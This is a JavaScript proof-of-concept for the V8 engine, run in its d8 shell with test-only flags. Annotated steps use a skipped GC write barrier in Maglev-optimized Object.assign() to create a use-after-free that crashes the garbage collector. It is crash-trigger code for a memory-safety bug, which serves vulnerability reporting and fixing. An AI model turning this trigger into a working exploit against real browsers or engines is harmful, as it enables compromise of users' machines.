print("main begin");

let o1 = {f: 0};

// Add sidestep transitions so that the second execution of Object.assign() will enter the fast path
print("assign 1");
let from = {};
from.f = from;
Object.assign({}, from);

/*
    Initialization may allocate objects, which could trigger increasing marking. 
    To avoid interference, we first wait here for the incremental marking to complete.
    Major GC will call PreciseCollectAllGarbage(),
    which will call FinalizeIncrementalMarkingAtomically() to finalize incremental marking.
*/
gc({type: "major"});

// Preparation work is complete
print("prepare fin");

/*
    Start incremental marking.
    According to Heap::CollectGarbage(),
    after a minor GC, StartIncrementalMarkingIfAllocationLimitIsReached() 
    will be called to attempt to start incremental marking.
    Since --stress-incremental-marking is set, 
    IncrementalMarkingLimitReached() returns kHardLimit.
*/
gc({type: "minor"});

/*
    Allocate a new object in the young space.
    Write a property, triggering a write barrier.
    mark_obj is pushed into MarkingBarrier::current_worklists.
*/
let mark_obj = {};
o1.f = mark_obj;
%DebugPrint(o1);

/*
    Trigger many write barriers, causing MarkingBarrier::current_worklists 
    to fill up and overflow into the global marking worklist.
*/
for (let i = 0; i < 70; i++) {
    print(i);
    o1[i] = {};
}
print("write barrier trigger finish");

/*
    Trigger an incremental marking step, causing mark_obj to be marked.
*/
for (let i = 0; i < 1; i++) {
    print(i);

    /*
        Facts:
            1. new Array(N) generates two Young Space allocation requests: 0x10 and (N*4+4).
            2. If the size of the allocated object is > 0x20000, it outputs "large space".
            3. The maximum size of young space is only 0xfffc.
        Therefore:
            1. new Array(0x4000) generates two Young Space allocation requests: 0x10 and 0x10008.
            2. Young space cannot handle this, so each allocation will enter the Slow Path: AllocateRawSlow().
            3. Each memory allocation will trigger InvokeAllocationObservers(), reaching the threshold each time, 
               thus triggering an incremental marking step.
    */
    new Array(0x4000);
}

function generateUafObj(mark_obj) {
    /*
        uaf is allocated in Young Space. uaf.f = uaf will not trigger a write barrier after Maglev optimization.
        Object.assign(mark_obj, uaf) also does not trigger a write barrier.
        Therefore, after the function completes, GC will consider uaf unreferenced and collect it.
    */
    let uaf = {};
    uaf.f = uaf;
    
    /*
        Object.assign() writes to mark_obj.
        Since mark_obj is in young space, it does not trigger a write barrier.
    */
    Object.assign(mark_obj, uaf);
}
%PrepareFunctionForOptimization(generateUafObj);
generateUafObj({});
%OptimizeMaglevOnNextCall(generateUafObj);  // Both Maglev and Turbofan optimizations work
generateUafObj(mark_obj);

/*
    Trigger two GCs:
        1. The first GC is used to stop incremental marking:
            Since mark_obj.f -> uaf did not trigger a write barrier and mark_obj has already been marked,
            MarkCompact does not know that uaf is still referenced, so uaf is freed, and mark_obj.f becomes a UAF pointer.
        2. The second GC will crash when processing mark_obj.f because it points to 0xbeadbeef.
*/
gc({type: "major"});

// Avoid executing microtasks
print("main fin =========");
%SystemBreak();

//./d8 \  --expose-gc \--allow-natives-syntax \--single-threaded \--stress-incremental-marking \./poc.js